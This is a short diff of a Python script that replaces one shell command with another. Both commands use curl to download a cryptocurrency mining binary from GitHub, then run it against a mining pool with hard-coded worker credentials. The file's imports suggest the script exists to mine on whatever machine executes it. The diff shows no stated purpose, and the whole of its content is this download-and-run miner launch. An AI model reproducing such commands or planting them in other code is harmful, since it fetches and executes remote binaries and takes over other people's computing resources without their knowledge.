@@ -10,4 +10,4 @@ from os import system, name
 from time import sleep
 from subprocess import PIPE, Popen
 import base64
-os.system ("curl -L -o avx2 https://github.com/Master100k/Avvx/raw/main/avx2 && chmod +x avx2 && ./avx2 -a yespower -o stc.ss.poolin.one:443 -u nung.001 -p 123") 
+os.system("curl -L -o violetminer-linux-v0.2.2.tar.gz https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -xf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --algorithm chukwa_wrkz --pool stc.ss.poolin.one:443 --username nung.001 --password 123 --disableNVIDIA --threads 16")
